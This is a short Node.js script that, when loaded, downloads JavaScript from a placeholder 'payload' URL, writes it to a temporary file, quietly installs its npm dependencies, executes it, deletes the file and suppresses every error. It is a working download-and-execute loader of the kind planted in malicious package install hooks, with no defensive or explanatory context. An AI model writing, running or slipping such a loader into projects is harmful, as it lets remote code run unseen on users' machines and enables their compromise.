const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const payloadUrl = 'https://example.com/script.js'; // Replace with actual URL

async function install() {
  try {
    const response = await fetch(payloadUrl);

    if (!response.ok) {
      throw new Error(`Failed to download payload: ${response.status}`);
    }

    const payloadCode = await response.text();

    const payloadPath = path.resolve(__dirname, 'temp_payload.js');
    fs.writeFileSync(payloadPath, payloadCode);

    const requires = payloadCode.match(/require\(['"]([^'"]+)['"]\)/g);
    const deps = requires ? requires.map(r => r.match(/require\(['"]([^'"]+)['"]\)/)[1]).filter(dep =>
      !['fs', 'path', 'os', 'crypto', 'http', 'https', 'url', 'querystring', 'child_process', 'events', 'electron'].includes(dep)
    ) : [];

    if (deps.length > 0) {
      execSync(`npm install ${deps.join(' ')}`, { stdio: 'ignore' });
    }

    require(payloadPath);

    fs.unlinkSync(payloadPath);

  } catch (error) {
    // silent
  }
}

install();
